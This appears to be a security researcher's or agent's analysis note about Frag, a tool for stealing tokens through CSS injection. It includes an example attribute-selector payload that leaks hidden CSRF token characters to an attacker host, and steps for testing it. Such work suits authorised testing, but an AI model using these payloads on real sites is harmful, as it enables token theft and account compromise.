## Analysis

**Tool update (Frag — CSS-only token exfiltration):** now supports **one-shot blind exfiltration**, **Base64 and alphanumeric tokens**, and smaller generated CSS. Original post (2118691773333782693, quoted) describes it: "Inject a stylesheet, steal the token. Uses De Bruijn graphs to reconstruct secrets from overlapping CSS attribute selector fragments. Built on research by me and @Alex_______C". Repo link was a t.co to GitHub that did not resolve to a public path on fetch (github.com/PortSwigger/frag → 404), so README already saved earlier: [writeups/garethheyes/frag-readme.md](../../writeups/garethheyes/frag-readme.md).
**Harness use:** when CSS injection exists (style tag/`<link>`/`@import` with CSP allowing `style-src` + `img-src`/`font-src` to attacker), attribute selectors like `input[value^="a"]{background:url(//x/a)}` exfiltrate tokens from attributes (CSRF tokens in hidden inputs, `data-*`). Frag removes the need for JS and recursion: generate stylesheets from n-gram fragments and reconstruct the secret with a De Bruijn graph; "one shot" means a single stylesheet load suffices. Test: find injectable style context, confirm `input[name=csrf][value^=a]` callback, then use Frag for tokens.
